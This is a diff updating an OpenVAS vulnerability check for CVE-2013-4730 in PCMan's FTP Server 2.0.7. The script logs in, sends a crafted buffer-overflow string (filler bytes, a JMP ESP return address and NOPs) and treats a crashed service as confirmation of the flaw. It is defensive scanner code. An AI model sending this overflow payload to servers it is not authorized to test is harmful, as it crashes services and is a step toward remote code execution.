@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_pcman_ftp_server_mult_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_pcman_ftp_server_mult_vuln.nasl 13347 2019-01-29 15:54:59Z cfischer $
 #
 # PCMan's FTP Server Multiple Vulnerabilities
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803825");
-  script_version("$Revision: 11401 $");
+  script_version("$Revision: 13347 $");
   script_cve_id("CVE-2013-4730");
   script_bugtraq_id(65289, 65299);
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-29 16:54:59 +0100 (Tue, 29 Jan 2019) $");
   script_tag(name:"creation_date", value:"2013-07-02 11:35:46 +0530 (Tue, 02 Jul 2013)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -42,74 +42,76 @@ if(description)
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
+
   script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to read or
-write arbitrary files or cause denial of service condition result in loss of
-availability for the application.");
+  write arbitrary files or cause denial of service condition result in loss of
+  availability for the application.");
+
   script_tag(name:"affected", value:"PCMan's FTP Server version 2.0.7");
+
   script_tag(name:"insight", value:"Improper sanitation of user supplied input via 'PAYLOAD', 'EIP',
-'USER', 'PASS', 'DIR', 'PUT' and 'NOP' parameters.");
-  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  'USER', 'PASS', 'DIR', 'PUT' and 'NOP' parameters.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"The remote host is installed with PCMan's FTP Server and is
-prone to multiple vulnerabilities.");
+  prone to multiple vulnerabilities.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
   exit(0);
 }
 
-
 include("ftp_func.inc");
 
-ftpPort = get_kb_item("Services/ftp");
-if(!ftpPort){
-  ftpPort = 21;
-}
-
-if(!get_port_state(ftpPort)){
-  exit(0);
-}
-
+ftpPort = get_ftp_port(default:21);
 banner = get_ftp_banner(port:ftpPort);
-if("220 PCMan's FTP Server" >!< banner){
+if(!banner || "220 PCMan's FTP Server" >!< banner){
   exit(0);
-}
-
-user = get_kb_item("ftp/login");
-if(!user){
-  user = "anonymous";
-}
-
-pass = get_kb_item("ftp/password");
-if(!pass){
-  pass = "anonymous";
 }
 
 soc = open_sock_tcp(ftpPort);
-if(!soc) exit(0);
+if(!soc){
+  exit(0);
+}
 
-## Login to the ftp server
+banner = ftp_recv_line(socket:soc);
+ftp_close(socket:soc);
+if(!banner || "220 PCMan's FTP Server" >!< banner){
+  exit(0);
+}
+
+soc = open_sock_tcp(ftpPort);
+if(!soc)
+  exit(0);
+
+kb_creds = ftp_get_kb_creds();
+user = kb_creds["login"];
+pass = kb_creds["pass"];
+
 ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
-if(!ftplogin) exit(0);
+if(!ftplogin)
+  exit(0);
 
 PAYLOAD = crap(data: "\x41", length:2010);
 EIP     = "\xDB\xFC\x1C\x75";  # 751CFCDB   JMP ESP USER32.DLL
 NOP     = crap(data: "\x90", length:10);
 
-## Send specially crafted RETR command
 send(socket:soc, data:string(PAYLOAD, EIP, NOP, '\r\n'));
-
 ftp_close(socket:soc);
 
 soc = open_sock_tcp(ftpPort);
-if(!soc)
-{
-  security_message(ftpPort);
+if(!soc){
+  security_message(port:ftpPort);
   exit(0);
 }
 
 ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
-if(!ftplogin)
-{
-  security_message(ftpPort);
+if(!ftplogin){
+  security_message(port:ftpPort);
   exit(0);
 }
